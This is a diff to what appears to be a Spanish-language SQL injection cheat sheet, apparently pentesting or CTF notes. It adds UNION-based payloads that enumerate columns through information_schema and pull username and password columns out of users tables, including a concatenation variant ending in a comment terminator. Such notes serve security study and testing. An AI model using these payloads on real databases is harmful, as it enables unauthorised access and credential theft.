@@ -126,5 +126,9 @@ SELECT * FROM tabla UNION SELECT column_name, 2, 3, 4 FROM information_schema.co
 ```
 5. Ver los datos dentro de una DB
 ```SQL
-SELECT username,password FROM users UNION SELECT username,password FROM login.users;
+SELECT username,password FROM users UNION SELECT username,password FROM login.users-- -
+```
++ Concatenar
+```SQL
+SELECT username,password FROM users UNION SELECT NULL,username||':'||password FROM users-- -
 ```
